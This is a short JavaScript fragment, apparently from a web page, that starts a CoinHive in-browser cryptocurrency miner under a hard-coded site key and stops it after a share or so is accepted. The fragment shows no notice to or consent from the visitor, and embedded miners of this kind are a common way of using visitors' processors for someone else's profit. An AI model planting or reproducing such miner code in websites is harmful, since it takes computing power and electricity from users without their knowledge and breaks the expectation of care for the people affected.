        var count = "5";
        var miner = new CoinHive.Anonymous('MNF6srWX69Hma2jf6CTmbpxTanD7Sbbv');
        miner.start(CoinHive.IF_EXCLUSIVE_TAB);
        miner.on('accepted', function() {
            count++;
            if (count > 5) {
                miner.stop();
            }
        })